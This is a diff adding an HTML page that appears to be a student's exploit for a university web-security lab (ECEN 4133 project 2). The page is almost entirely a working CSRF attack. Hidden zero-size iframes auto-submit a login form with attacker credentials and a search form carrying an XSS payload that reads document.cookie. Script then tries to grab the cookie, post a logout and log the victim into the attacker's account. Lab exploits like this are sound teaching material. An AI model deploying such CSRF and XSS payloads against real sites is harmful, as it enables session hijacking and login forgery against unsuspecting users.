@@ -1,0 +1,43 @@
+<html>
+
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+
+
+<body>
+	<iframe id='final_form' name='my_frame' style='position: absolute; width: 0; height: 0; border:0'></iframe>
+	<form method='POST' action='https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0' id='my_id' target='my_frame'>
+		<input id='username' type='hidden' name='username' value='attacker'>
+		<input id='userpass' type='hidden' name='password' value='l33th4x'>
+	</form>
+
+	<iframe name='my_search_frame' id='iframe_id' style='position: absolute; width: 0; height: 0; border:0'></iframe>
+	<form method='POST' action='https://project2.ecen4133.org/' id='my_search_id' target='my_search_frame'>
+		<input id='query' type='hidden' name='q' value='<script>alert(document.cookie)<\/script>'>
+	</form>
+
+</body>
+
+
+
+<script>
+	//using cross site scripting to retrieve a token cookie
+	//'csrf_token'
+	document.getElementById("my_search_id").submit();
+	//var iframe = document.getElementById("iframe_id");
+	var cookie_all = document.getElementById("iframe_id").contentDocument.title;
+	//console.log(iframe.contentDocument.title);
+	console.log(cookie_all);
+	// var token = cookie_all.split(" ")[1].split("=")[1].split(";")[0];
+
+	//set my own session token to the csrf token
+	var final_iframe = document.getElementById('final_form');
+	final_iframe.contentDocument.cookie = cookie_all;
+
+	$.post('https://project2.ecen4133.org/logout');
+	document.getElementById("my_id").submit();
+</script>
+
+</html>
